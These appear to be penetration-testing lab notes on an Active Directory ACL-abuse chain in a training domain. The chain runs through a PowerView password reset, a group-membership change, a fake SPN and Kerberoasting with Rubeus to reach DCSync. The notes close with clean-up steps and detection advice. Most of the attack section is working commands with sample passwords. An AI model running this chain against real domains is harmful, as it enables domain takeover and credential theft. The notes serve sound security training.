- We know `adunn` is vulnerable to `DCSync`
	- this will give us full access to the DC
- CURRENT SCENARIO:
	- We have `wley` user
	- use `wley` to change the password for `damundsen` user
	- authenticate as `damundsen` user and leverage `GenericWrite` rights to add a user that we control to the `Help Desk Level 1` group.
	- the nested group `Information Technology` can be used to leverage `GenericAll` rights to take control of the `adunn` user

## Workflow:
- If we are logged in as `wley`, we can skip this step.
- If not
### Create a PSCredential Object
- `$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force`
- `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) `
### Create a password for `damundsen`
- `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
### Change domain users password
- `Import-Module .\PowerView.ps1`
- `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`
	- We set the password for `damundsen` using the creds of `wley`
### Creating a PScreds object
- `$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)`
### Adding user to a domain group
- `Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`
	- Check if the user is already a member of the domain group we want to add him to
- `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
	- add `damundsen` to `Help Desk Level 1` group using `damundsen's` `Cred2` PSCreds object
- `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName`
	- Confirm if the user is added to this group
<br>
- This new group membership can allow us to take control of `adunn`
- But, what if the client says we cannot change the password or `adunn`
- In this case, we can perform a kerberoasting attack to get the password hash by creating a fake SPN
- To do this, we need to be authenticated as a member of the `Information Technology` group.
- Since `damundsen` is a member of `Help desk 1`, it inherits rights for the `Information Technology` group
### Creating a fake SPN
- `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
	- Response - `VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'`
### Kerberoasting with Rubeus
- `.\Rubeus.exe kerberoast /user:adunn /nowrap`
- Crack the hash
- sign in as `adunn` for DCSync

<hr>

## Clean Up
- should be done in a specific order
- Remove fake SPN created for `adunn`
	- `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`
- Remove `damundsen` from `Help Desk 1`
	- `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`
- Confirm if `damundsen` was removed
	- `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose`
- change `damundsen` to the old password or notify the client of this change

<hr>

## Detection and Remediation
1. `Auditing for and removing dangerous ACLs` 
2. `Monitor group membership`
3. `Audit and monitor for ACL changes`
